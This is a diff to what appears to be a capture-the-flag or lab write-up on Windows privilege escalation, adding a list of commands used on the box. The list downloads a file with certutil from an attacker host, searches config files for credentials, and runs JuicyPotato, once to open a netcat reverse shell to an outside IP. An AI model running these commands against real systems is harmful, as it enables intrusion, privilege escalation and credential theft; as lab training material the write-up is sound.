@@ -66,7 +66,15 @@
 - **Bonus**: After finishing I suddenly realized (actually from reading Medium — I tend to read other people's write-ups after I finish a box to see if I can learn anything new and to see how they explain it), there is an easier privilege escalation method using Always Install Elevated settings. OK, you can practice that part yourselves.<br>
 <img width="882" height="273" alt="image" src="https://github.com/user-attachments/assets/f1b7220b-6bce-4fa4-b8d9-d85a4d92f622" /> <br>
 
-
+**Command using in these box:**
+````
+certutil.exe -urlcache -f http://IP:Port/Filename.ext c:\users\public\Filename.ext
+Wmic qfe
+Get-ChildItem [DirectorytoSearch] -Recurse -Include *.config,*.xml,*.ini,*.yml,*.json -ErrorAction SilentlyContinue | Select-String -Pattern "ldapadmin" -SimpleMatch -ErrorAction SilentlyContinue
+Get-ChildItem C:\ -Recurse -Include [Filename]-ErrorAction Ignore
+JuicyPotato.exe -t * -l 1337 -p cmd.exe -a "/c whoami" -c {90F18417-F0F1-484E-9D3C-59DCEEE5DBD8} // Test CSLID of Windows 2016
+JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\Users\Public\nc.exe 10.10.15.92 7777 -e cmd.exe" -t * -c "{7A6D9C0A-1E7A-41B6-82B4-C3F7A27BA381}" // Command to call reverse shell
+````
 
 
 
